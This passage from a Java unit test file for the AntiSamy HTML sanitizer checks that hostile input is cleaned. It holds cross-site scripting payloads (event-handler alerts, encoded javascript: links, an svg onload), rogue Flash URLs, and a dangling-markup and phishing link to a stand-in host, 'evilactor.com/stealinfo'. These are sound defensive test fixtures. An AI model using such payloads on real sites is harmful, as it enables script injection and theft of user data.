bad=\\\"true\\\">link</a>\", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // rel with bad value gets corrected\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"blh\\\">link</a>\", revisedPolicy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"blh\\\">link</a>\", revisedPolicy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // correct attribute doesn't get messed with\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // if two correct attributes, only one remaining after scan\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n        assertTrue(as.scan(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\" rel=\\\"nofollow\\\">link</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<a href=\\\"blah\\\" rel=\\\"nofollow\\\">link</a>\"));\n\n        // test if value is off - does it add?\n        assertTrue(!as.scan(\"a href=\\\"blah\\\">link</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"nofollow\"));\n        assertTrue(!as.scan(\"a href=\\\"blah\\\">link</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"nofollow\"));\n    }\n\n    @Test\n    public void validateParamAsEmbed() throws ScanException, PolicyException {\n        // activate policy setting for this test\n        Policy revised = policy.cloneWithDirective(Policy.VALIDATE_PARAM_AS_EMBED, \"true\").cloneWithDirective(Policy.FORMAT_OUTPUT, \"false\").cloneWithDirective(Policy.USE_XHTML, \"true\");\n\n        // let's start with a YouTube embed\n        String input = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\"></param><param name=\\\"allowFullScreen\\\" value=\\\"true\\\"></param><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\"></param><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\"></embed></object>\";\n        String expectedOutput = \"<object height=\\\"340\\\" width=\\\"560\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed allowfullscreen=\\\"true\\\" allowscriptaccess=\\\"always\\\" height=\\\"340\\\" src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" width=\\\"560\\\" /></object>\";\n        CleanResults cr = as.scan(input, revised, AntiSamy.DOM);\n        assertThat(cr.getCleanHTML(), containsString(expectedOutput));\n\n        String saxExpectedOutput = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\" /></object>\";\n        cr = as.scan(input, revised, AntiSamy.SAX);\n        assertThat(cr.getCleanHTML(), equalTo(saxExpectedOutput));\n\n        // now what if someone sticks malicious URL in the value of the\n        // value attribute in the param tag? remove that param tag\n        input = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://supermaliciouscode.com/badstuff.swf\\\"></param><param name=\\\"allowFullScreen\\\" value=\\\"true\\\"></param><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\"></param><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\"></embed></object>\";\n        expectedOutput = \"<object height=\\\"340\\\" width=\\\"560\\\"><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed allowfullscreen=\\\"true\\\" allowscriptaccess=\\\"always\\\" height=\\\"340\\\" src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" width=\\\"560\\\" /></object>\";\n        saxExpectedOutput = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /><embed src=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\" /></object>\";\n        cr = as.scan(input, revised, AntiSamy.DOM);\n        assertThat(cr.getCleanHTML(), containsString(expectedOutput));\n\n        cr = as.scan(input, revised, AntiSamy.SAX);\n        assertThat(cr.getCleanHTML(), equalTo(saxExpectedOutput));\n\n        // now what if someone sticks malicious URL in the value of the src\n        // attribute in the embed tag? remove that embed tag\n        input = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&hl=en&fs=1&\\\"></param><param name=\\\"allowFullScreen\\\" value=\\\"true\\\"></param><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\"></param><embed src=\\\"http://hereswhereikeepbadcode.com/ohnoscary.swf\\\" type=\\\"application/x-shockwave-flash\\\" allowscriptaccess=\\\"always\\\" allowfullscreen=\\\"true\\\" width=\\\"560\\\" height=\\\"340\\\"></embed></object>\";\n        expectedOutput = \"<object height=\\\"340\\\" width=\\\"560\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /></object>\";\n        saxExpectedOutput = \"<object width=\\\"560\\\" height=\\\"340\\\"><param name=\\\"movie\\\" value=\\\"http://www.youtube.com/v/IyAyd4WnvhU&amp;hl=en&amp;fs=1&amp;\\\" /><param name=\\\"allowFullScreen\\\" value=\\\"true\\\" /><param name=\\\"allowscriptaccess\\\" value=\\\"always\\\" /></object>\";\n\n        cr = as.scan(input, revised, AntiSamy.DOM);\n        assertThat(cr.getCleanHTML(), containsString(expectedOutput));\n        CleanResults scan = as.scan(input, revised, AntiSamy.SAX);\n        assertThat(scan.getCleanHTML(), equalTo(saxExpectedOutput));\n    }\n\n    @Test\n    public void compareSpeedsShortStrings() throws IOException, ScanException, PolicyException {\n\n        double totalDomTime = 0;\n        double totalSaxTime = 0;\n\n        int testReps = 1000;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        for (int j = 0; j < testReps; j++) {\n            totalDomTime += as.scan(html, policy, AntiSamy.DOM).getScanTime();\n            totalSaxTime += as.scan(html, policy, AntiSamy.SAX).getScanTime();\n        }\n\n        System.out.println(\"Total DOM time short string: \" + totalDomTime);\n        System.out.println(\"Total SAX time short string: \" + totalSaxTime);\n    }\n\n    @Test\n    public void profileDom() throws IOException, ScanException, PolicyException {\n        runProfiledTest(AntiSamy.DOM);\n    }\n\n    @Test\n    public void profileSax() throws IOException, ScanException, PolicyException {\n        runProfiledTest(AntiSamy.SAX);\n    }\n\n    private void runProfiledTest(int scanType) throws ScanException, PolicyException {\n        double totalDomTime;\n\n        warmup(scanType);\n\n        int testReps = 9999;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        Double each = 0D;\n        int repeats = 10;\n        for (int i = 0; i < repeats; i++) {\n            totalDomTime = 0;\n            for (int j = 0; j < testReps; j++) {\n                totalDomTime += as.scan(html, policy, scanType).getScanTime();\n            }\n            each = each + totalDomTime;\n            System.out.println(\"Total \" + (scanType == AntiSamy.DOM ? \"DOM\" : \"SAX\") + \" time 9999 reps short string: \" + totalDomTime);\n        }\n        System.out.println(\"Average time: \" + (each / repeats));\n    }\n\n    private void warmup(int scanType) throws ScanException, PolicyException {\n        int warmupReps = 15000;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        for (int j = 0; j < warmupReps; j++) {\n            as.scan(html, policy, scanType).getScanTime();\n        }\n    }\n\n    @Test\n    public void comparePatternSpeed() throws IOException, ScanException, PolicyException {\n\n        final Pattern invalidXmlCharacters =\n                Pattern.compile(\"[\\\\u0000-\\\\u001F\\\\uD800-\\\\uDFFF\\\\uFFFE-\\\\uFFFF&&[^\\\\u0009\\\\u000A\\\\u000D]]\");\n\n        int testReps = 10000;\n\n        String html = \"<body> hey you <img/> out there on your own </body>\";\n\n        String s = null;\n        //long start = System.currentTimeMillis();\n        for (int j = 0; j < testReps; j++) {\n            s = invalidXmlCharacters.matcher(html).replaceAll(\"\");\n        }\n        //long total = System.currentTimeMillis() - start;\n\n        //start = System.currentTimeMillis();\n        Matcher matcher;\n        for (int j = 0; j < testReps; j++) {\n            matcher = invalidXmlCharacters.matcher(html);\n            if (matcher.matches()) {\n                s = matcher.replaceAll(\"\");\n            }\n        }\n        //long total2 = System.currentTimeMillis() - start;\n\n        assertNotNull(s);\n        //System.out.println(\"replaceAllDirect \" + total);\n        //System.out.println(\"match then replace: \" + total2);\n    }\n\n    @Test\n    public void testOnsiteRegex() throws ScanException, PolicyException {\n    \tassertIsGoodOnsiteURL(\"foo\");\n    \tassertIsGoodOnsiteURL(\"/foo/bar\");\n    \tassertIsGoodOnsiteURL(\"../../di.cgi?foo&amp;3D~\");\n    \tassertIsGoodOnsiteURL(\"/foo/bar/1/sdf;jsessiond=1f1f12312_123123\");\n    }\n    \n    void assertIsGoodOnsiteURL(String url) throws ScanException, PolicyException {\n    \tString html = as.scan(\"<a href=\\\"\" + url + \"\\\">X</a>\", policy, AntiSamy.DOM).getCleanHTML();\n        assertThat(html, containsString(\"href=\\\"\"));\n\t}\n    \n\t@Test\n    public void issue10() throws ScanException, PolicyException {\n    \tassertFalse(as.scan(\"<a href=\\\"javascript&colon;alert&lpar;1&rpar;\\\">X</a>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertFalse(as.scan(\"<a href=\\\"javascript&colon;alert&lpar;1&rpar;\\\">X</a>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n    }\n    \n    @Test\n    public void issue147() throws ScanException, PolicyException {\n        URL url = getClass().getResource(\"/antisamy-tinymce.xml\");\n\n        Policy pol = Policy.getInstance(url);\n        as.scan(\"<table><tr><td></td></tr></table>\", pol, AntiSamy.DOM);\n    }\n\n    @Test\n    public void issue75() throws ScanException, PolicyException {\n        URL url = getClass().getResource(\"/antisamy-tinymce.xml\");\n        Policy pol = Policy.getInstance(url);\n        as.scan(\"<script src=\\\"<. \\\">\\\"></script>\", pol, AntiSamy.DOM);\n        as.scan(\"<script src=\\\"<. \\\">\\\"></script>\", pol, AntiSamy.SAX);\n    }\n\n    @Test\n    public void issue144() throws ScanException, PolicyException {\n        String pinata = \"pi\\u00f1ata\";\n        CleanResults results = as.scan(pinata, policy, AntiSamy.DOM);\n        String cleanHTML = results.getCleanHTML();\n        assertEquals(pinata, cleanHTML);\n    }\n\n    @Test\n    public void testWhitespaceNotBeingMangled() throws ScanException, PolicyException {\n        String test = \"<select name=\\\"name\\\"><option value=\\\"Something\\\">Something</select>\";\n        String expected = \"<select name=\\\"name\\\"><option value=\\\"Something\\\">Something</option></select>\";\n        Policy preserveSpace = policy.cloneWithDirective( Policy.PRESERVE_SPACE, \"true\" );\n        CleanResults preserveSpaceResults = as.scan(test, preserveSpace, AntiSamy.SAX);\n        assertEquals( expected, preserveSpaceResults.getCleanHTML() );\n    }\n\n    @Test\n    public void testDataTag159() throws ScanException, PolicyException {\n        /* issue #159 - allow dynamic HTML5 data-* attribute */\n        String good = \"<p data-tag=\\\"abc123\\\">Hello World!</p>\";\n        String bad = \"<p dat-tag=\\\"abc123\\\">Hello World!</p>\";\n        String goodExpected = \"<p data-tag=\\\"abc123\\\">Hello World!</p>\";\n        String badExpected = \"<p>Hello World!</p>\";\n        // test good attribute \"data-\"\n        CleanResults cr = as.scan(good, policy, AntiSamy.SAX);\n        String s = cr.getCleanHTML();\n        assertEquals(goodExpected, s);\n        // test bad attribute \"dat-\"\n        cr = as.scan(bad, policy, AntiSamy.SAX);\n        s = cr.getCleanHTML();\n        assertEquals(badExpected, s);\n    }\n\n    @Test\n    public void testXSSInAntiSamy151() throws ScanException, PolicyException {\n        String test = \"<bogus>whatever</bogus><img src=\\\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\\\" \"\n            + \"onmouseover=\\\"alert('xss')\\\">\";\n        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);\n        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);\n\n        assertEquals( results_sax.getCleanHTML(), results_dom.getCleanHTML());\n        assertEquals(\"whatever<img src=\\\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\\\" />\", results_dom.getCleanHTML());\n    }\n\n    @Test\n    public void testAnotherXSS() throws ScanException, PolicyException {\n        String test = \"<a href=\\\"http://example.com\\\"&amp;/onclick=alert(9)>foo</a>\";\n        CleanResults results_sax = as.scan(test, policy, AntiSamy.SAX);\n        CleanResults results_dom = as.scan(test, policy, AntiSamy.DOM);\n\n        assertEquals( results_sax.getCleanHTML(), results_dom.getCleanHTML());\n        assertEquals(\"<a href=\\\"http://example.com\\\" rel=\\\"nofollow\\\">foo</a>\", results_dom.getCleanHTML());\n    }\n\n    @Test\n    public void testIssue2() throws ScanException, PolicyException {\n        String test = \"<style onload=alert(1)>h1 {color:red;}</style>\";\n        assertThat(as.scan(test, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"alert\")));\n        assertThat(as.scan(test, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"alert\")));\n    }\n    \n    /*\n     * Mailing list user sent this in. Didn't work, but good test to leave in.\n     */\n    @Test\n    public void testUnknownTags() throws ScanException, PolicyException {\n        String test = \"<%/onmouseover=prompt(1)>\";\n        CleanResults saxResults = as.scan(test, policy, AntiSamy.SAX);\n        CleanResults domResults = as.scan(test, policy, AntiSamy.DOM);\n        assertThat(saxResults.getCleanHTML(), not(containsString(\"<%/\")));\n        assertThat(domResults.getCleanHTML(), not(containsString(\"<%/\")));\n    }\n    \n    @Test\n    public void testStreamScan() throws ScanException, PolicyException, InterruptedException, ExecutionException {\n        String testImgSrcURL = \"<img src=\\\"https://ssl.gstatic.com/codesite/ph/images/defaultlogo.png\\\" \";\n        Reader reader = new StringReader(\"<bogus>whatever</bogus>\" + testImgSrcURL + \"onmouseover=\\\"alert('xss')\\\">\");\n        Writer writer = new StringWriter();\n        as.scan(reader, writer, policy);\n        String cleanHtml = writer.toString().trim();\n        assertEquals(\"whatever\" + testImgSrcURL + \"/>\", cleanHtml);\n    }\n    \n    @Test\n    public void testGithubIssue23() throws ScanException, PolicyException {\n    \t\n        // Antisamy Stripping nested lists and tables\n    \tString test23 = \"<ul><li>one</li><li>two</li><li>three<ul><li>a</li><li>b</li></ul></li></ul>\";\n    \t// Issue claims you end up with this:\n    \t//    <ul><li>one</li><li>two</li><li>three<ul></ul></li><li>a</li><li>b</li></ul>\n    \t// Meaning the <li>a</li><li>b</li> elements were moved outside of the nested <ul> list they were in\n    \t\n    \t// The a.replaceAll(\"\\\\s\",\"\") is used to strip out all the whitespace in the CleanHTML so we can successfully find\n    \t// what we expect to find.\n        assertThat(as.scan(test23, policy, AntiSamy.SAX).getCleanHTML().replaceAll(\"\\\\s\",\"\"), containsString(\"<ul><li>a</li>\"));\n        assertThat(as.scan(test23, policy, AntiSamy.DOM).getCleanHTML().replaceAll(\"\\\\s\",\"\"), containsString(\"<ul><li>a</li>\"));\n        \n        // However, the test above can't replicate this misbehavior.\n    }\n    \n    // TODO: This issue is a valid enhancement request we plan to implement in the future.\n    // Commenting out the test case for now so test failures aren't included in a released version of AntiSamy.\n/*    @Test\n    public void testGithubIssue24() throws ScanException, PolicyException {\n    \t\n        // if we have onUnknownTag set to encode, it still strips out the @ and everything else after the it\n    \t// DOM Parser actually rips out the entire <name@mail.com> value even with onUnknownTag set\n        TestPolicy revisedPolicy = policy.cloneWithDirective(\"onUnknownTag\", \"encode\");\n\n    \tString email = \"name@mail.com\";\n        String test24 = \"firstname,lastname<\" + email + \">\";\n        assertThat(as.scan(test24, revisedPolicy, AntiSamy.SAX).getCleanHTML(), containsString(email));\n        assertThat(as.scan(test24, revisedPolicy, AntiSamy.DOM).getCleanHTML(), containsString(email));\n    }\n*/\n    @Test\n    public void testGithubIssue26() throws ScanException, PolicyException {\n        // Potential bypass (False positive)\n    \tString test26 = \"&#x22;&#x3E;&#x3C;&#x69;&#x6D;&#x67;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x61;&#x20;&#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3E;\";\n    \t// Issue claims you end up with this:\n    \t//   ><img src=a onerror=alert(1)>\n    \t\n        assertThat(as.scan(test26, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"<img src=a onerror=alert(1)>\")));\n        assertThat(as.scan(test26, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"<img src=a onerror=alert(1)>\")));\n        \n        // But you actually end up with this: &quot;&gt;&lt;img src=a onerror=alert(1)&gt; -- Which is as expected\n    }\n    \n    @Test\n    public void testGithubIssue27() throws ScanException, PolicyException {\n    \t// This test doesn't cause an ArrayIndexOutOfBoundsException, as reported in this issue even though it\n    \t// replicates the test as described.\n        String test27 = \"my &test\";\n        assertThat(as.scan(test27, policy, AntiSamy.DOM).getCleanHTML(), containsString(\"test\"));\n        assertThat(as.scan(test27, policy, AntiSamy.SAX).getCleanHTML(), containsString(\"test\"));\n    }\n\nstatic final String test33 = \"<html>\\n\"\n    \t  + \"<head>\\n\"\n    \t  + \"  <title>Test</title>\\n\"\n    \t  + \"</head>\\n\"\n    \t  + \"<body>\\n\"\n    \t  + \"  <h1>Tricky Encoding</h1>\\n\"\n    \t  + \"  <h2>NOT Sanitized by AntiSamy</h2>\\n\"\n    \t  + \"  <ol>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#00058x=alert,x%281%29\\\">X&#00058;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#00058y=alert,y%281%29\\\">X&#00058;y</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#58x=alert,x%281%29\\\">X&#58;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#58y=alert,y%281%29\\\">X&#58;y</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#x0003Ax=alert,x%281%29\\\">X&#x0003A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#x0003Ay=alert,y%281%29\\\">X&#x0003A;y</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#x3Ax=alert,x%281%29\\\">X&#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#x3Ay=alert,y%281%29\\\">X&#x3A;y</a></li>\\n\"\n    \t  + \"  </ol>\\n\"\n    \t  + \"  <h1>Tricky Encoding with Ampersand Encoding</h1>\\n\"\n    \t  + \"  <p>AntiSamy turns harmless payload into XSS by just decoding the encoded ampersands in the href attribute</a>\\n\"\n    \t  + \"  <ol>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&amp;#x3Ax=alert,x%281%29\\\">X&amp;#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&AMP;#x3Ax=alert,x%281%29\\\">X&AMP;#x3A;x</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#38;#x3Ax=alert,x%281%29\\\">X&#38;#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#00038;#x3Ax=alert,x%281%29\\\">X&#00038;#x3A;x</a></li>\\n\"\n\n    \t  + \"    <li><a href=\\\"javascript&#x26;#x3Ax=alert,x%281%29\\\">X&#x26;#x3A;x</a></li>\\n\"\n    \t  + \"    <li><a href=\\\"javascript&#x00026;#x3Ax=alert,x%281%29\\\">X&#x00026;#x3A;x</a></li>\\n\"\n    \t  + \"  </ol>\\n\"\n    \t  + \"  <p><a href=\\\"javascript&#x3Ax=alert,x%281%29\\\">Original without ampersand encoding</a></p>\\n\"\n    \t  + \"</body>\\n\"\n    \t  + \"</html>\";\n    \t\t\t\n    @Test\n    public void testGithubIssue33() throws ScanException, PolicyException {\n        \t\n        // Potential bypass\n\n        // Issue claims you end up with this:\n        //   javascript:x=alert and other similar problems (javascript&#00058x=alert,x%281%29) but you don't.\n        //   So issue is a false positive and has been closed.\n        //System.out.println(as.scan(test33, policy, AntiSamy.SAX).getCleanHTML());\n\n        assertThat(as.scan(test33, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"javascript&#00058x=alert,x%281%29\")));\n        assertThat(as.scan(test33, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"javascript&#00058x=alert,x%281%29\")));\n    }\n    \n    // TODO: This issue is a valid enhancement request. We are trying to decide whether to implement in the future.\n    // Commenting out the test case for now so test failures aren't included in a released version of AntiSamy.\n/*\n    @Test\n    public void testGithubIssue34a() throws ScanException, PolicyException {\n\n    \t// bypass stripNonValidXMLCharacters\n    \t// Issue indicates: \"<div>Hello\\\\uD83D\\\\uDC95</div>\" should be sanitized to: \"<div>Hello</div>\"\n    \t\n        String test34a = \"<div>Hello\\uD83D\\uDC95</div>\";\n        assertEquals(\"<div>Hello</div>\", as.scan(test34a, policy, AntiSamy.SAX).getCleanHTML());\n        assertEquals(\"<div>Hello</div>\", as.scan(test34a, policy, AntiSamy.DOM).getCleanHTML());\n    }\n\n    @Test\n    public void testGithubIssue34b() throws ScanException, PolicyException {\n\n    \t// bypass stripNonValidXMLCharacters\n    \t// Issue indicates: \"<div>Hello\\\\uD83D\\\\uDC95</div>\" should be sanitized to: \"<div>Hello</div>\"\n    \t\n        String test34b = \"\\uD888\";\n        assertEquals(\"\", as.scan(test34b, policy, AntiSamy.DOM).getCleanHTML());\n        assertEquals(\"\", as.scan(test34b, policy, AntiSamy.SAX).getCleanHTML());\n    }\n*/\n\n    static final String test40 = \"<html>\\n\"\n          + \"<head>\\n\"\n          + \"  <title>Test</title>\\n\"\n          + \"</head>\\n\"\n          + \"<body>\\n\"\n          + \"  <h1>Tricky Encoding</h1>\\n\"\n          + \"  <h2>NOT Sanitized by AntiSamy</h2>\\n\"\n          + \"  <ol>\\n\"\n          + \"    <li><h3>svg onload=alert follows:</h3><svg onload=alert(1)//</li>\\n\"\n          + \"  </ol>\\n\"\n          + \"</body>\\n\"\n          + \"</html>\";\n\n    @Test\n    public void testGithubIssue40() throws ScanException, PolicyException {\n\n        // Concern is that: <svg onload=alert(1)//  does not get cleansed.\n        // Based on these test results, it does get cleaned so this issue is a false positive, so we closed it.\n\n        assertThat(as.scan(test40, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"<svg onload=alert(1)//\")));\n        //System.out.println(\"SAX parser: \" + as.scan(test40, policy, AntiSamy.SAX).getCleanHTML());\n        assertThat(as.scan(test40, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"<svg onload=alert(1)//\")));\n        //System.out.println(\"DOM parser: \" + as.scan(test40, policy, AntiSamy.DOM).getCleanHTML());\n    }\n\n    @Test\n    public void testGithubIssue48() throws ScanException, PolicyException {\n\n        // Concern is that onsiteURL regex is not safe for URLs that start with //.\n        // For example:  //evilactor.com?param=foo\n\n        final String phishingAttempt = \"<a href=\\\"//evilactor.com/stealinfo?a=xxx&b=xxx\\\"><span style=\\\"color:red;font-size:100px\\\">\"\n                + \"You must click me</span></a>\";\n\n        // Output: <a rel=\"nofollow\"><span style=\"color: red;font-size: 100.0px;\">You must click me</span></a>\n\n        assertThat(as.scan(phishingAttempt, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n        assertThat(as.scan(phishingAttempt, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n\n        // This ones never failed, they're just to prove a dangling markup attack on the following resulting HTML won't work.\n        // Less probable case (steal more tags):\n        final String danglingMarkup = \"<div>User input: \" +\n                \"<input type=\\\"text\\\" name=\\\"input\\\" value=\\\"\\\"><a href='//evilactor.com?\"+\n                \"\\\"> all this info wants to be stolen with <i>danlging markup attack</i>\" +\n                \" until a single quote to close is found'</div>\";\n\n        assertThat(as.scan(danglingMarkup, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n        assertThat(as.scan(danglingMarkup, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n\n        // More probable case (steal just an attribute):\n        //      HTML before attack: <input type=\"text\" name=\"input\" value=\"\" data-attribute-to-steal=\"some value\">\n        final String danglingMarkup2 = \"<div>User input: \" +\n                \"<input type=\\\"text\\\" name=\\\"input\\\" value=\\\"\\\" data-attribute-to-steal=\\\"some value\\\">\";\n        \n        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"//evilactor.com/\")));\n    }\n\n @Test\n    public void testGithubIssue62() {\n        // Concern is that when a processing instruction is at the root level, node removal gets messy and Null pointer exception arises.\n        // More test cases are added for PI removal.\n\n        try{\n            assertThat(as.scan(\"|<?ai aaa\", policy, AntiSamy.DOM).getCleanHTML(), is(\"|\"));\n            assertThat(as.scan(\"|<?ai aaa\", policy, AntiSamy.SAX).getCleanHTML(), is(\"|\"));\n\n            assertThat(as.scan(\"<div>|<?ai aaa\", policy, AntiSamy.DOM).getCleanHTML(), is(\"<div>|</div>\"));\n            assertThat(as.scan(\"<div>|<?ai aaa\", policy, AntiSamy.SAX).getCleanHTML(), is(\"<div>|</div>\"));\n\n            assertThat(as.scan(\"<div><?foo note=\\\"I am XML processing instruction. I wish to be excluded\\\" ?></div>\", policy, AntiSamy.DOM)\n                    .getCleanHTML(), not(containsString(\"<?foo\")));\n            assertThat(as.scan(\"<div><?foo note=\\\"I am XML processing instruction. I wish to be excluded\\\" ?></div>\", policy, AntiSamy.SAX)\n                    .getCleanHTML(), not(containsString(\"<?foo\")));\n\n            assertThat(as.scan(\"<?xml-stylesheet type=\\\"text/css\\\" href=\\\"style.css\\\"?>\", policy, AntiSamy.DOM).getCleanHTML(), is(\"\"));\n            assertThat(as.scan(\"<?xml-stylesheet type=\\\"text/css\\\" href=\\\"style.css\\\"?>\", policy, AntiSamy.SAX).getCleanHTML(), is(\"\"));\n\n        } catch (Exception exc) {\n            fail(exc.getMessage());\n        }\n    }\n\n    @Test\n    public void testGithubIssue81() throws ScanException, PolicyException {\n        // Concern is that \"!important\" is missing after processing CSS\n        assertThat(as.scan(\"<p style=\\\"color: red !important\\\">Some Text</p>\", policy, AntiSamy.DOM).getCleanHTML(), containsString(\"!important\"));\n        assertThat(as.scan(\"<p style=\\\"color: red !important\\\">Some Text</p>\", policy, AntiSamy.SAX).getCleanHTML(), containsString(\"!important\"));\n\n        // Just to check scan keeps working accordingly without \"!important\"\n        assertThat(as.scan(\"<p style=\\\"color: red\\\">Some Text</p>\", policy, AntiSamy.DOM).getCleanHTML(), not(containsString(\"!important\")));\n        assertThat(as.scan(\"<p style=\\\"color: red\\\">Some Text</p>\", policy, AntiSamy.SAX).getCleanHTML(), not(containsString(\"!important\")));\n    }\n\n    @Test\n    public void entityReferenceEncodedInHtmlAttribute() throws ScanException, PolicyException {\n        // Concern is that \"&\" is not being encoded and \"#00058\" was not being interpreted as \":\"\n        // so the validations based on regexp passed and a browser would load \"&:\" together.\n        // All this when not using the XHTML serializer.\n        Policy revised = policy.cloneWithDirective(\"useXHTML\",\"false\");\n        assertThat(as.scan(\"<p><a href=\\\"javascript&#00058x=1,%61%6c%65%72%74%28%22%62%6f%6f%6d%22%29\\\">xss</a></p>\", revised, AntiSamy.DOM).getCleanHTML(),\n                containsString(\"javascript&amp;#00058\"));\n        assertThat(as.scan(\"<p><a href=\\\"javascript&#00058x=1,%61%6c%65%72%74%28%22%62%6f%6f%6d%22%29\\\">xss</a></p>\", 